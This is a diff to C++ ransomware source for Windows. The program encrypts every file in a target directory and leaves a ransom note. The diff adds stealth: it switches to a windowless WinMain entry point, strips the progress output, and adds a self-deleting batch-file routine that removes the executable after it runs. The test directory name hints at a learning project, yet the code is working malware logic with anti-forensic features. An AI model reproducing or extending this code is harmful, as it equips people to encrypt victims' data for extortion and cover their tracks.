@@ -12,8 +12,9 @@ using recursive_directory_iterator = std::filesystem::recursive_directory_iterat
 
 void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename);
 void leaveNote(std::string target_dir, const char* message);
+void deleteSelf();
 
-int main(){
+int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
 
     std::string target_dir = "dummy_directory_1";
     std::filesystem::path myPath = target_dir;
@@ -27,7 +28,6 @@ int main(){
         if (!dirEntry.is_directory()){
 
             file = dirEntry.path().generic_string();
-            printf("encrypting %s... \n", file.c_str());
             encryptFile(key_chars, iv, file.c_str());
 
             std::filesystem::path oldName = file;
@@ -37,6 +37,7 @@ int main(){
     }
     const char* ransom_message = "Harharhar! You've been hit by ransomware! Contact this email to negotiate: not_a_hacker@gmail.com.";
     leaveNote(target_dir, ransom_message);
+    deleteSelf();
     return 0;
 }
 
@@ -71,5 +72,25 @@ void leaveNote(std::string target_dir, const char* message){
     FILE* notePtr = fopen(ransom_note_file.c_str(), "w");
     fprintf(notePtr, "%s", message);
     fclose(notePtr);
-    printf("Done leaving note.\n");
+}
+
+void deleteSelf(){
+    
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);      
+
+    std::string batchFileName = "del.bat";
+    std::ofstream batchFile(batchFileName);
+    batchFile << "@echo off\n";
+    batchFile << "timeout /t 2 > nul\n"; 
+    batchFile << "del \"" << exePath << "\"\n";
+    batchFile << "del \"%~f0\"\n";       
+    batchFile.close();
+
+    // some very bizarre code that I don't even understand yet
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessA(NULL, const_cast<char*>(batchFileName.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 }
